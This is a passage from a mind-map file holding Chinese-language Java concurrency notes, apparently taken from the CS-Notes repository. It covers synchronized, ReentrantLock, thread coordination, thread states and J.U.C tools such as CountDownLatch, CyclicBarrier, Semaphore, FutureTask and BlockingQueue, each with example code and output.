    }
}</pre>
    <p dir="auto">
      它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。
    </p>
    <p dir="auto">
      对于以下代码，使用 ExecutorService 执行了两个线程，由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。
    </p>
    <pre>public class SynchronizedExample {
    public void func1() {
        synchronized (this) {
            for (int i = 0; i &lt; 10; i++) {
                System.out.print(i + &quot; &quot;);
            }
        }
    }
}</pre>
    <pre>public static void main(String[] args) {
    SynchronizedExample e1 = new SynchronizedExample();
    ExecutorService executorService = Executors.newCachedThreadPool();
    executorService.execute(() -&gt; e1.func1());
    executorService.execute(() -&gt; e1.func1());
}</pre>
    <pre>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9</pre>
    <p dir="auto">
      对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。
    </p>
    <pre>public static void main(String[] args) {
    SynchronizedExample e1 = new SynchronizedExample();
    SynchronizedExample e2 = new SynchronizedExample();
    ExecutorService executorService = Executors.newCachedThreadPool();
    executorService.execute(() -&gt; e1.func1());
    executorService.execute(() -&gt; e2.func1());
}</pre>
    <pre>0 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9</pre>
    <p dir="auto">
      <strong>2. 同步一个方法</strong>
    </p>
    <pre>public synchronized void func () {
    // ...
}</pre>
    <p dir="auto">
      它和同步代码块一样，作用于同一个对象。
    </p>
    <p dir="auto">
      <strong>3. 同步一个类</strong>
    </p>
    <pre>public void func() {
    synchronized (SynchronizedExample.class) {
        // ...
    }
}</pre>
    <p dir="auto">
      作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也会进行同步。
    </p>
    <pre>public class SynchronizedExample {
    public void func2() {
        synchronized (SynchronizedExample.class) {
            for (int i = 0; i &lt; 10; i++) {
                System.out.print(i + &quot; &quot;);
            }
        }
    }
}</pre>
    <pre>public static void main(String[] args) {
    SynchronizedExample e1 = new SynchronizedExample();
    SynchronizedExample e2 = new SynchronizedExample();
    ExecutorService executorService = Executors.newCachedThreadPool();
    executorService.execute(() -&gt; e1.func2());
    executorService.execute(() -&gt; e2.func2());
}</pre>
    <pre>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9</pre>
    <p dir="auto">
      <strong>4. 同步一个静态方法</strong>
    </p>
    <pre>public synchronized static void fun() {
    // ...
}</pre>
    <p dir="auto">
      作用于整个类。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_845568331" CREATED="1754750650531" MODIFIED="1754750650532"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ReentrantLock
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: ReentrantLock" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#reentrantlock">
</a>
    <p dir="auto">
      ReentrantLock 是 java.util.concurrent（J.U.C）包中的锁。
    </p>
    <pre>public class LockExample {
    private Lock lock = new ReentrantLock();
    public void func() {
        lock.lock();
        try {
            for (int i = 0; i &lt; 10; i++) {
                System.out.print(i + &quot; &quot;);
            }
        } finally {
            lock.unlock(); // 确保释放锁，从而避免发生死锁。
        }
    }
}</pre>
    <pre>public static void main(String[] args) {
    LockExample lockExample = new LockExample();
    ExecutorService executorService = Executors.newCachedThreadPool();
    executorService.execute(() -&gt; lockExample.func());
    executorService.execute(() -&gt; lockExample.func());
}</pre>
    <pre>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1904946528" CREATED="1754750650532" MODIFIED="1754750650534"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#比较">
</a>
    <p dir="auto">
      <strong>1. 锁的实现</strong>
    </p>
    <p dir="auto">
      synchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。
    </p>
    <p dir="auto">
      <strong>2. 性能</strong>
    </p>
    <p dir="auto">
      新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等，synchronized 与 ReentrantLock 大致相同。
    </p>
    <p dir="auto">
      <strong>3. 等待可中断</strong>
    </p>
    <p dir="auto">
      当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。
    </p>
    <p dir="auto">
      ReentrantLock 可中断，而 synchronized 不行。
    </p>
    <p dir="auto">
      <strong>4. 公平锁</strong>
    </p>
    <p dir="auto">
      公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。
    </p>
    <p dir="auto">
      synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但是也可以是公平的。
    </p>
    <p dir="auto">
      <strong>5. 锁绑定多个条件</strong>
    </p>
    <p dir="auto">
      一个 ReentrantLock 可以同时绑定多个 Condition 对象。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1268229408" CREATED="1754750650535" MODIFIED="1754750650536"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      使用选择
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 使用选择" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#使用选择">
</a>
    <p dir="auto">
      除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_492704060" CREATED="1754750650537" MODIFIED="1754750650538"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、线程之间的协作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、线程之间的协作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#五线程之间的协作">
</a>
    <p dir="auto">
      当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。
    </p>
  </body>
</html></richcontent>
<node ID="ID_96590929" CREATED="1754750650539" MODIFIED="1754750650540"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      join()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: join()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#join">
</a>
    <p dir="auto">
      在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。
    </p>
    <p dir="auto">
      对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先于 b 线程的输出。
    </p>
    <pre>public class JoinExample {
    private class A extends Thread {
        @Override
        public void run() {
            System.out.println(&quot;A&quot;);
        }
    }
    private class B extends Thread {
        private A a;
        B(A a) {
            this.a = a;
        }
        @Override
        public void run() {
            try {
                a.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.out.println(&quot;B&quot;);
        }
    }
    public void test() {
        A a = new A();
        B b = new B(a);
        b.start();
        a.start();
    }
}</pre>
    <pre>public static void main(String[] args) {
    JoinExample example = new JoinExample();
    example.test();
}</pre>
    <pre class="notranslate">A
B</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1197666690" CREATED="1754750650541" MODIFIED="1754750650543"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      wait() notify() notifyAll()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: wait() notify() notifyAll()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#wait-notify-notifyall">
</a>
    <p dir="auto">
      调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。
    </p>
    <p dir="auto">
      它们都属于 Object 的一部分，而不属于 Thread。
    </p>
    <p dir="auto">
      只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateException。
    </p>
    <p dir="auto">
      使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。
    </p>
    <pre>public class WaitNotifyExample {
    public synchronized void before() {
        System.out.println(&quot;before&quot;);
        notifyAll();
    }
    public synchronized void after() {
        try {
            wait();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(&quot;after&quot;);
    }
}</pre>
    <pre>public static void main(String[] args) {
    ExecutorService executorService = Executors.newCachedThreadPool();
    WaitNotifyExample example = new WaitNotifyExample();
    executorService.execute(() -&gt; example.after());
    executorService.execute(() -&gt; example.before());
}</pre>
    <pre>before
after</pre>
    <p dir="auto">
      <strong>wait() 和 sleep() 的区别</strong>
    </p>
    <ul dir="auto">
      <li>
        wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法；
      </li>
      <li>
        wait() 会释放锁，sleep() 不会。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1623351376" CREATED="1754750650543" MODIFIED="1754750650545"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      await() signal() signalAll()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: await() signal() signalAll()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#await-signal-signalall">
</a>
    <p dir="auto">
      java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。
    </p>
    <p dir="auto">
      相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。
    </p>
    <p dir="auto">
      使用 Lock 来获取一个 Condition 对象。
    </p>
    <pre>public class AwaitSignalExample {
    private Lock lock = new ReentrantLock();
    private Condition condition = lock.newCondition();
    public void before() {
        lock.lock();
        try {
            System.out.println(&quot;before&quot;);
            condition.signalAll();
        } finally {
            lock.unlock();
        }
    }
    public void after() {
        lock.lock();
        try {
            condition.await();
            System.out.println(&quot;after&quot;);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            lock.unlock();
        }
    }
}</pre>
    <pre>public static void main(String[] args) {
    ExecutorService executorService = Executors.newCachedThreadPool();
    AwaitSignalExample example = new AwaitSignalExample();
    executorService.execute(() -&gt; example.after());
    executorService.execute(() -&gt; example.before());
}</pre>
    <pre>before
after</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_929764566" CREATED="1754750650545" MODIFIED="1754750650547"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、线程状态
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、线程状态" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#六线程状态">
</a>
    <p dir="auto">
      一个线程只能处于一种状态，并且这里的线程状态特指 Java 虚拟机的线程状态，不能反映线程在特定操作系统下的状态。
    </p>
  </body>
</html></richcontent>
<node ID="ID_850386616" CREATED="1754750650547" MODIFIED="1754750650548"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      新建（NEW）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 新建（NEW）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#新建new">
</a>
    <p dir="auto">
      创建后尚未启动。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_563827054" CREATED="1754750650549" MODIFIED="1754750650550"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      可运行（RUNABLE）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 可运行（RUNABLE）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#可运行runable">
</a>
    <p dir="auto">
      正在 Java 虚拟机中运行。但是在操作系统层面，它可能处于运行状态，也可能等待资源调度（例如处理器资源），资源调度完成就进入运行状态。所以该状态的可运行是指可以被运行，具体有没有运行要看底层操作系统的资源调度。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1295668732" CREATED="1754750650550" MODIFIED="1754750650552"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      阻塞（BLOCKED）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 阻塞（BLOCKED）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#阻塞blocked">
</a>
    <p dir="auto">
      请求获取 monitor lock 从而进入 synchronized 函数或者代码块，但是其它线程已经占用了该 monitor lock，所以出于阻塞状态。要结束该状态进入从而 RUNABLE 需要其他线程释放 monitor lock。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_955861355" CREATED="1754750650552" MODIFIED="1754750650554"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      无限期等待（WAITING）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 无限期等待（WAITING）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#无限期等待waiting">
</a>
    <p dir="auto">
      等待其它线程显式地唤醒。
    </p>
    <p dir="auto">
      阻塞和等待的区别在于，阻塞是被动的，它是在等待获取 monitor lock。而等待是主动的，通过调用 Object.wait() 等方法进入。
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          进入方法
        </th>
        <th>
          退出方法
        </th>
      </tr>
      <tr>
        <td>
          没有设置 Timeout 参数的 Object.wait() 方法
        </td>
        <td>
          Object.notify() / Object.notifyAll()
        </td>
      </tr>
      <tr>
        <td>
          没有设置 Timeout 参数的 Thread.join() 方法
        </td>
        <td>
          被调用的线程执行完毕
        </td>
      </tr>
      <tr>
        <td>
          LockSupport.park() 方法
        </td>
        <td>
          LockSupport.unpark(Thread)
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_28329837" CREATED="1754750650554" MODIFIED="1754750650556"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      限期等待（TIMED_WAITING）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 限期等待（TIMED_WAITING）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#限期等待timed_waiting">
</a>
    <p dir="auto">
      无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          进入方法
        </th>
        <th>
          退出方法
        </th>
      </tr>
      <tr>
        <td>
          Thread.sleep() 方法
        </td>
        <td>
          时间结束
        </td>
      </tr>
      <tr>
        <td>
          设置了 Timeout 参数的 Object.wait() 方法
        </td>
        <td>
          时间结束 / Object.notify() / Object.notifyAll()
        </td>
      </tr>
      <tr>
        <td>
          设置了 Timeout 参数的 Thread.join() 方法
        </td>
        <td>
          时间结束 / 被调用的线程执行完毕
        </td>
      </tr>
      <tr>
        <td>
          LockSupport.parkNanos() 方法
        </td>
        <td>
          LockSupport.unpark(Thread)
        </td>
      </tr>
      <tr>
        <td>
          LockSupport.parkUntil() 方法
        </td>
        <td>
          LockSupport.unpark(Thread)
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1800218190" CREATED="1754750650557" MODIFIED="1754750650559"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      死亡（TERMINATED）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 死亡（TERMINATED）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#死亡terminated">
</a>
    <p dir="auto">
      可以是线程结束任务之后自己结束，或者产生了异常而结束。
    </p>
    <p dir="auto">
      <a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html" rel="nofollow">Java SE 9 Enum Thread.State</a>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1866202867" CREATED="1754750650560" MODIFIED="1754750650561"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、J.U.C - AQS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、J.U.C - AQS" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#七juc---aqs">
</a>
    <p dir="auto">
      java.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。
    </p>
  </body>
</html></richcontent>
<node ID="ID_176899817" CREATED="1754750650561" MODIFIED="1754750650563"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      CountDownLatch
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: CountDownLatch" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#countdownlatch">
</a>
    <p dir="auto">
      用来控制一个或者多个线程等待多个线程。
    </p>
    <p dir="auto">
      维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3556fc9aa0864564760775dec76e7f3c2011c2c4437e53b1317da0242c5507ba/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62613037383239312d373931652d343337382d623664312d6563653736633266306231342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/3556fc9aa0864564760775dec76e7f3c2011c2c4437e53b1317da0242c5507ba/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62613037383239312d373931652d343337382d623664312d6563653736633266306231342e706e67" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ba078291-791e-4378-b6d1-ece76c2f0b14.png"/>
    </a><br/>
    

    <pre>public class CountdownLatchExample {
    public static void main(String[] args) throws InterruptedException {
        final int totalThread = 10;
        CountDownLatch countDownLatch = new CountDownLatch(totalThread);
        ExecutorService executorService = Executors.newCachedThreadPool();
        for (int i = 0; i &lt; totalThread; i++) {
            executorService.execute(() -&gt; {
                System.out.print(&quot;run..&quot;);
                countDownLatch.countDown();
            });
        }
        countDownLatch.await();
        System.out.println(&quot;end&quot;);
        executorService.shutdown();
    }
}</pre>
    <pre>run..run..run..run..run..run..run..run..run..run..end</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1579256335" CREATED="1754750650564" MODIFIED="1754750650565"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      CyclicBarrier
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: CyclicBarrier" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#cyclicbarrier">
</a>
    <p dir="auto">
      用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。
    </p>
    <p dir="auto">
      和 CountdownLatch 相似，都是通过维护计数器来实现的。线程执行 await() 方法之后计数器会减 1，并进行等待，直到计数器为 0，所有调用 await() 方法而在等待的线程才能继续执行。
    </p>
    <p dir="auto">
      CyclicBarrier 和 CountdownLatch 的一个区别是，CyclicBarrier 的计数器通过调用 reset() 方法可以循环使用，所以它才叫做循环屏障。
    </p>
    <p dir="auto">
      CyclicBarrier 有两个构造函数，其中 parties 指示计数器的初始值，barrierAction 在所有线程都到达屏障的时候会执行一次。
    </p>
    <pre>public CyclicBarrier(int parties, Runnable barrierAction) {
    if (parties &lt;= 0) throw new IllegalArgumentException();
    this.parties = parties;
    this.count = parties;
    this.barrierCommand = barrierAction;
}
public CyclicBarrier(int parties) {
    this(parties, null);
}</pre>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0e457fb85faa43081cf6993625c7ec1035777083ed11bc61180e3d3d8f3412d5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66373161663636622d306435342d343339392d613434622d6634376235383332313938342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/0e457fb85faa43081cf6993625c7ec1035777083ed11bc61180e3d3d8f3412d5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66373161663636622d306435342d343339392d613434622d6634376235383332313938342e706e67" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f71af66b-0d54-4399-a44b-f47b58321984.png"/>
    </a><br/>
    

    <pre>public class CyclicBarrierExample {
    public static void main(String[] args) {
        final int totalThread = 10;
        CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread);
        ExecutorService executorService = Executors.newCachedThreadPool();
        for (int i = 0; i &lt; totalThread; i++) {
            executorService.execute(() -&gt; {
                System.out.print(&quot;before..&quot;);
                try {
                    cyclicBarrier.await();
                } catch (InterruptedException | BrokenBarrierException e) {
                    e.printStackTrace();
                }
                System.out.print(&quot;after..&quot;);
            });
        }
        executorService.shutdown();
    }
}</pre>
    <pre>before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after..</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1401269239" CREATED="1754750650565" MODIFIED="1754750650567"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Semaphore
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Semaphore" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#semaphore">
</a>
    <p dir="auto">
      Semaphore 类似于操作系统中的信号量，可以控制对互斥资源的访问线程数。
    </p>
    <p dir="auto">
      以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。
    </p>
    <pre>public class SemaphoreExample {
    public static void main(String[] args) {
        final int clientCount = 3;
        final int totalRequestCount = 10;
        Semaphore semaphore = new Semaphore(clientCount);
        ExecutorService executorService = Executors.newCachedThreadPool();
        for (int i = 0; i &lt; totalRequestCount; i++) {
            executorService.execute(()-&gt;{
                try {
                    semaphore.acquire();
                    System.out.print(semaphore.availablePermits() + &quot; &quot;);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } finally {
                    semaphore.release();
                }
            });
        }
        executorService.shutdown();
    }
}</pre>
    <pre>2 1 2 2 2 2 2 1 2 2</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_491064500" CREATED="1754750650567" MODIFIED="1754750650567"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、J.U.C - 其它组件
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1915595203" CREATED="1754750650569" MODIFIED="1754750650570"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      FutureTask
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: FutureTask" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#futuretask">
</a>
    <p dir="auto">
      在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future&lt;V&gt; 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future&lt;V&gt; 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。
    </p>
    <pre>public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt;</pre>
    <pre>public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt;</pre>
    <p dir="auto">
      FutureTask 可用于异步获取执行结果或取消执行任务的场景。当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，主线程在完成自己的任务之后再去获取结果。
    </p>
    <pre>public class FutureTaskExample {
    public static void main(String[] args) throws ExecutionException, InterruptedException {
        FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(new Callable&lt;Integer&gt;() {
            @Override
            public Integer call() throws Exception {
                int result = 0;
                for (int i = 0; i &lt; 100; i++) {
                    Thread.sleep(10);
                    result += i;
                }
                return result;
            }
        });
        Thread computeThread = new Thread(futureTask);
        computeThread.start();
        Thread otherThread = new Thread(() -&gt; {
            System.out.println(&quot;other task is running...&quot;);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });
        otherThread.start();
        System.out.println(futureTask.get());
    }
}</pre>
    <pre>other task is running...
4950</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1996103105" CREATED="1754750650571" MODIFIED="1754750650573"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      BlockingQueue
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: BlockingQueue" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#blockingqueue">
</a>
    <p dir="auto">
      java.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现：
    </p>
    <ul dir="auto">
      <li>
        <strong>FIFO 队列</strong>&#xa0;：LinkedBlockingQueue、ArrayBlockingQueue（固定长度）
      </li>
      <li>
        <strong>优先级队列</strong>&#xa0;：PriorityBlockingQueue
      </li>
    </ul>
    <p dir="auto">
      提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，直到队列有空闲位置。
    </p>
    <p dir="auto">
      <strong>使用 BlockingQueue 实现生产者消费者问题</strong>
    </p>
    <pre>public class ProducerConsumer {
    private static BlockingQueue&lt;String&gt; queue = new ArrayBlockingQueue&lt;&gt;(5);
    private static class Producer extends Thread {
        @Override
        public void run() {
            try {
                queue.put(&quot;product&quot;);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.out.print(&quot;produce..&quot;);
        }
    }
    private static class Consumer extends Thread {
        @Override
        public void run() {
            try {
                String product = queue.take();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.out.print(&quot;consume..&quot;);
        }
    }
}</pre>
    <pre>public static void main(String[] args) {
    for (int i = 0; i &lt; 2; i++) {
        Producer producer = new Producer();
        producer.start();
    }
    for (int i = 0; i &lt; 5; i++) {
        Consumer consumer = new Consumer();
        consumer.start();
    }
    for (int i = 0; i &lt; 3; i++) {
        Producer producer = new Producer();
        producer.start();
    }
}</pre>
    <pre>produce..produce..consume..consume..produce..consume..produce..consume..produce..consume..</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_98844492" CREATED="1754750650573" MODIFIED="1754750650576"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ForkJoin
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: ForkJoin" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#forkjoin">
</a>
    <p dir="auto">
